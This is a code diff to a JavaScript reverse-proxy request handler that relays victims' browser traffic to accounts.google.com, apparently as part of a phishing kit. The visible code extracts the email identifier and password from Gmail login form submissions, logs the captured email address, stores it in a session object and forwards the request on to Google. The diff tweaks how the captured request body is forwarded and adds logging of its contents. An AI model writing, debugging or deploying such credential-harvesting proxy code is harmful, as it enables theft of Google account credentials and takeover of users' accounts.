@@ -41,10 +41,15 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
             })
             this.browserReq.on('end', () => {
                 cJust += ''
+                console.log('Original request content:', cJust.substring(0, 200))
+                
+                // Only replace hostname in URLs, not in form data
                 const hostDomainRegex = new RegExp(this.browserReq.clientContext.hostname, 'gi')
                 const kJust = cJust.replace(hostDomainRegex, 'accounts.google.com')
+                
+                console.log('Modified request content:', kJust.substring(0, 200))
 
-                this.proxyEndpoint.setHeader('Content-Length', kJust.length)
+                this.proxyEndpoint.setHeader('Content-Length', cJust.length)
 
                 // Regex patterns for actual Gmail form data format
                 const emailRegex = /identifier=([^&]+)/
@@ -84,10 +89,10 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
                     Object.assign(this.browserReq.clientContext.sessionBody,
                         { email: emailGmail })
                     console.log(`email address is ${emailGmail}`)
-                    // Forward the request to Gmail and let it process the form submission
-                    this.proxyEndpoint.write(kJust) 
+                    // Forward the ORIGINAL request to Gmail without modifications
+                    this.proxyEndpoint.write(cJust) 
                     this.proxyEndpoint.end()
-                    console.log('Request forwarded to Gmail, waiting for response...')
+                    console.log('Original request forwarded to Gmail, waiting for response...')
 
                 } else if (passwordMatch) {
                     console.log('Password matched')
